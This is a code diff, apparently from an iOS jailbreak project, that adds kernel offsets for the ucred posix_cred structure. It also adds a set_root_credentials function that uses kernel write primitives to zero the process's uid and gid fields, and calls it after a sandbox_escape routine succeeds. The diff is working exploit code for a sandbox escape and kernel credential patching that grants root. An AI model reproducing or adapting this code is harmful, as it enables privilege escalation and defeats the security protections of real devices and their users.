@@ -54,6 +54,16 @@ _Static_assert(sizeof("com.apple.app-sandbox.read-write") - 1 == KRW_LEN,
 #define OFF_PROC_PROC_RO       0x18  // proc → proc_ro (stable 17.0-26.x)
 #define OFF_PROC_RO_UCRED      0x20  // proc_ro → p_ucred (verified all versions)
 #define OFF_UCRED_CR_LABEL     0x78  // ucred → cr_label (KDK struct dump)
+
+// posix_cred lives inside ucred at +0x18 (16B cr_link + 8B cr_ref).
+// Layout (K4.13, from FilzaSlop's IDA/KDK dumps, sizeof=0x60):
+//   +0x00 cr_uid · +0x04 cr_ruid · +0x08 cr_svuid · +0x0C cr_ngroups
+//   +0x10 cr_groups[0..15] · +0x50 cr_gid/rgid · +0x54 cr_svgid
+//   +0x58 cr_gmuid · +0x5C cr_flags
+#define OFF_UCRED_CR_POSIX     0x18
+#define OFF_POSIX_CR_UID       0x00
+#define OFF_POSIX_CR_GROUPS0   0x10
+#define OFF_POSIX_CR_GID       0x50
 #define OFF_LABEL_SANDBOX      0x10  // label → sandbox (MAC l_perpolicy[1])
 #define OFF_SANDBOX_EXT_SET    0x10  // sandbox → ext_set
 #define OFF_EXT_DATA           0x40  // ext → data_addr
@@ -135,6 +145,53 @@ static void set_rw_class(uint64_t hdr) {
     early_kread(hdr, hb, KRW_LEN);
     hb[0x10 / 8] = da + 32;
     early_kwrite32bytes(hdr, hb);
+}
+
+#pragma mark - Root credentials (K4.13)
+
+// Patch ucred->cr_posix so the process runs as root:wheel for EVERYTHING —
+// completes the "Root Ownership" feature without relying on per-file fsnode
+// chown. Zeroes uid/ruid/svuid, gid/rgid/svgid (+gmuid, harmless), and
+// cr_groups[0]. cr_ngroups is preserved.
+//
+// Uses kwrite32 (read-modify-write of the enclosing 64-bit word) per field —
+// adjacent data (cr_ngroups, cr_gmuid/cr_flags, and cr_label right after the
+// 0x60-byte posix_cred) is NEVER touched, and no oversized buffer writes are
+// possible. Read-back verified. Best-effort: a failure does NOT fail the
+// sandbox escape.
+static int set_root_credentials(uint64_t ucred) {
+    if (!K(ucred)) { TweakLog("[SBX] root creds: invalid ucred"); return -1; }
+    uint64_t posix = ucred + OFF_UCRED_CR_POSIX;
+
+    uint32_t old_uid = kread32(posix + OFF_POSIX_CR_UID);
+    uint32_t old_g0  = kread32(posix + OFF_POSIX_CR_GROUPS0);
+    uint32_t old_gid = kread32(posix + OFF_POSIX_CR_GID);
+    TweakLog("[SBX] posix_cred before: uid=%u gid=%u groups[0]=%u",
+             old_uid, old_gid, old_g0);
+    if (old_uid == 0 && old_gid == 0) {
+        TweakLog("[SBX] posix_cred already root");
+        return 0;
+    }
+
+    kwrite32(posix + OFF_POSIX_CR_UID, 0);        // cr_uid
+    kwrite32(posix + 0x04, 0);                    // cr_ruid
+    kwrite32(posix + 0x08, 0);                    // cr_svuid
+    kwrite32(posix + OFF_POSIX_CR_GROUPS0, 0);    // cr_groups[0]
+    kwrite32(posix + OFF_POSIX_CR_GID, 0);        // cr_gid
+    kwrite32(posix + 0x54, 0);                    // cr_rgid (or cr_svgid)
+    kwrite32(posix + 0x58, 0);                    // cr_svgid / cr_gmuid — zeroing harmless
+
+    // Verify by read-back.
+    uint32_t vuid = kread32(posix + OFF_POSIX_CR_UID);
+    uint32_t vg0  = kread32(posix + OFF_POSIX_CR_GROUPS0);
+    uint32_t vgid = kread32(posix + OFF_POSIX_CR_GID);
+    if (vuid == 0 && vgid == 0 && vg0 == 0) {
+        TweakLog("[SBX] *** ROOT CREDENTIALS ACTIVE: uid=0 gid=0 groups[0]=0 (root:wheel) ***");
+        return 0;
+    }
+    TweakLog("[SBX] root credential patch VERIFY FAILED (uid=%u gid=%u groups0=%u)",
+             vuid, vgid, vg0);
+    return -1;
 }
 
 #pragma mark - Main entry
@@ -246,12 +303,14 @@ int sandbox_escape(uint64_t self_proc) {
     if (successCount >= 2) {
         TweakLog("[SBX] *** SANDBOX ESCAPED (R+W) — %d/%d tests passed ***",
               successCount, (int)(sizeof(testPaths)/sizeof(testPaths[0]) - 1));
+        set_root_credentials(ucred);
         return 0;
     }
 
     // If user-level tests fail, verify via kernel sandbox_check
     if (check_sandbox_var_rw() == 0) {
         TweakLog("[SBX] Kernel sandbox_check confirms R+W despite userspace test failure");
+        set_root_credentials(ucred);
         return 0;
     }
 
